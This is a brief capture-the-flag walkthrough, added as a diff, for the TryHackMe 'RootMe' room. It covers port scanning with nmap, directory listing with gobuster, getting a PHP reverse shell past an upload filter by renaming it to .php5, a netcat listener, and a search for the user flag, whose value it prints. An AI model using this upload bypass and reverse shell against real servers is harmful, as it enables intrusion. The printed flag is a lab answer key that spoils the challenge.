@@ -1,0 +1,49 @@
+All steps and concepts about CTF made on https://tryhackme.com/room/rrootme:
+
+1 - PortScaning
+
+    nmap -sV 10.10.150.31
+
+2 - List directories and paths with Gobuster
+
+    cd "/usr/share/wordlists/dirbuster"
+
+    gobuster dir -u http://10.10.150.31/ -w directory-list-2.3-small.txt -x php, html, txt
+    
+3 - Open the Attack Machine on tryhackme
+
+4 - The http://10.10.150.31/ is a webpage site
+
+    On Gobuster, listed the path /panel/ that contains a upload form, this way is a oportunity to upload scripts.
+    We can use to upload a malisius** script to 'get a shell'
+    This form dont allow upload .php extentions
+    But if rename the extention to .php5, it bypass
+    Upload the php-reverse-shell.php5 editing the IP and port of Machine tryhackme panel
+
+Making Reverse Sheel - Tune connection
+
+5 - On tryhackme Attack Machine, open the port 3333 with netcat
+
+    nc -nlv 3333
+
+6 - The http://10.10.150.31/upload list all the uploaded files, you'll find the sheel.php5, click on to execute
+  
+7 - So, the connection will be created, on terminal of tryhackme, you'll execute commands inside server the page is running
+
+8 - The firt flag of CTF is find a file user.txt and get this content
+
+    find / -name user.txt
+
+    cat user.txt
+
+    THM{y0u_g0t_a_sh3ll}
+
+
+
+10.10.150.31
+https://www.youtube.com/watch?v=Bn8ufPXOwAQ
+
+Concepts:
+#PortScaning
+#Gobuster
+#Reverse shell
